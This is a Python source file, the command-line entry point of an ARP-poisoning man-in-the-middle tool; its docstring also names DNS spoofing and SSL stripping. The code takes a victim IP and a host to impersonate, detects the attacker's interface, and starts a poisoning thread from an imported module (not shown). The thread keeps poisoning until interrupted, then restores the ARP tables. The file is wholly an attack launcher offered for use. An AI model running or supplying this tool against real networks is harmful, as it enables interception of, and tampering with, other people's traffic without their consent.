"""
Main entry point for the tool.
Accepts command-line arguments and starts the ARP poisoning/DNS sspoofing/SSl stripping attack.
"""

import time
import click
from arp_poisoner import ARPPoisoner, listen
from network_utils import get_interface_info


@click.command()
@click.option("--victim-ip", required=True, help="IP address of the victim.")
@click.option(
    "--target-ip",
    required=True,
    help="IP address of the host you want to impersonate (gateway/website).",
)
@click.option(
    "--interface", "-i", help="Network interface to use (default: auto-detect)."
)
def main(victim_ip, target_ip, interface):
    """
    Handles CLI input, sets up the interface, and launches the ARP MITM attack.
    """

    # Resolve interface + attacker IP/MAC
    iface, attacker_ip = get_interface_info(interface)
    click.echo(f"[+] Using interface {iface} (IP: {attacker_ip})")

    # Start ARP poisoning
    arp = ARPPoisoner(
        iface=iface,
        victim_ip=victim_ip,
        target_ip=target_ip,
    )
    arp.start()

    click.echo(
        click.style(
            f"[+] ARP poisoning started between {victim_ip} <-> {target_ip}",
            fg="magenta",
        )
    )
    click.echo("[+] Press CTRL+C to stop and restore ARP tables.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        click.echo("\n[!] Stopping attack and restoring network...")
        arp.stop()
        arp.join()
        click.echo("[+] Clean exit.")


if __name__ == "__main__":
    main()  # pylint: disable=no-value-for-parameter
